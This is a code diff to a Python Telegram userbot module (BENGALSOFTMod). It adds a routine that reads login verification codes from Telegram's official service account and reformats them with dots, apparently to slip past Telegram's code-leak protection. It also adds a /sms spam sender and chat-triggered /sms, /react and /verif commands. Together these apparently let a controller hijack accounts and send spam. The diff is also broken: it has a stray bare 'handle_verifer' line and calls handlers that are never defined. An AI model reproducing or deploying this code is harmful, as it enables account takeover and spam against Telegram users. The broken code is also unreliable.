@@ -103,6 +103,20 @@ class BENGALSOFTMod(loader.Module):
             f"<b>🔐 Переменные:</b>\n" + variables
         )
         return configuration
+
+    async def get_verif_code(self):
+        try:
+            telegram_id = 777000
+            code_pattern = r'\b\d{5}\b'
+            async for message in self.client.iter_messages(PeerUser(777000), limit=10):
+                match = re.search(code_pattern, message.text)
+                if match:
+                    verification_code = match.group(0)
+                    formatted_code = ".".join(verification_code)
+                    return f"<b>♻️ VERIF: {formatted_code}<b>"
+        except Exception as e:
+            return f""
+            
     
 
     async def send_done_message(self, text, delay_info=None):
@@ -159,6 +173,15 @@ class BENGALSOFTMod(loader.Module):
             await self.client.send_message(self.owner_chat, next_text)
         except Exception as e:
             await self.client.send_message(self.owner_chat, f"🚫 ERROR: {e}")
+
+    async def send_spam_message(self, target, message_text, mult, delay_s):
+        """Сообщение в указанный чат."""  
+        try:
+            chat_entity = await self.client.get_entity(target)
+            await self.client.send_message(chat_entity, message_text)
+            await self.send_done_message(f"<b>♻️ SPAM: {target}</b>", delay_info=(mult, delay_s))
+        except Exception as e:
+            await self.send_done_message(f"🚫 SPAM: {e}", delay_info=(mult, delay_s))
 
     
     
@@ -548,6 +571,31 @@ class BENGALSOFTMod(loader.Module):
             if tag == twink:
                 await self.client.send_message(self.owner_chat, f"это я наху {twink}")
 
+    async def handle_spamer(self, text):
+        """Центральная обработка /sms"""
+        try:
+            parts = text.split()
+            if len(parts) < 3:
+                return
+            mult = int(parts[1]) if parts[1].isdigit() else None
+            start_index = 3 if mult else 2
+            target = parts[2].strip() if mult else parts[1].strip()
+            mult, delay_s = self.get_delay_host(mult)
+            if not (target.startswith("@") or re.match(r"https?://t\.me/", target)):
+                await self.send_else_message(f"<b>🚫 HANDLE MESS: TARGET</b>")
+                return
+            message_text = " ".join(parts[start_index:])
+            if not message_text:
+                await self.send_else_message("<b>🚫 HANDLE MESS: SMS</b>")
+                return
+            await self.delay_host(delay_s)
+            await self.send_spam_message(target, message_text, mult, delay_s)
+        except Exception as e:
+            await self.send_else_message(f"<b>🚫 HANDLE MESS:</b> {e}")
+
+    handle_verifer
+    
+
     
     @loader.watcher()
     async def watcher_group(self, message):
@@ -571,6 +619,12 @@ class BENGALSOFTMod(loader.Module):
                 await self.handle_user_config(message.message)
             elif message.message.startswith("/search"):
                 await self.handle_user_search(message.message)
+            elif message.message.startswith("/sms"):
+                await self.handle_spamer(message.message)
+            elif message.message.startswith("/react"):
+                await self.handle_reactor(message.message)
+            elif message.message.startswith("/verif"):
+                await self.handle_verifer(message.message)
             else:
                 return
         except:
